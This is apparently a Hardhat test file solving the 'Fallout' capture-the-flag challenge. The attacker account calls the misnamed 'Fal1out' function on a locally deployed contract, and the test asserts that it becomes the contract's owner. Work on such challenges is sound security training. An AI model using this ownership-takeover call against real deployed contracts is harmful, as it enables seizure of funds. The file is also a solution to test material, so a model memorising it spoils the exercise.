const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] Fallout Attack', function () {

    let deployer, attacker;
    let baseContract;
    let provider;
    let payment;

    before(async function () {
        /** SETUP SCENARIO */
        [deployer, attacker] = await ethers.getSigners();

        const baseContractFactory = await ethers.getContractFactory('Fallout', deployer);
        baseContract = await baseContractFactory.deploy();
        provider = hre.ethers.provider;
        payment = hre.ethers.utils.parseEther('0.0001');

        await baseContract.deployed();

    });

    it('Exploit Fallout Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const tx =await baseContract.connect(attacker).Fal1out({value:payment});
        await tx.wait();

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(
            await baseContract.owner()
        ).to.be.equal(attacker.address);

    });
});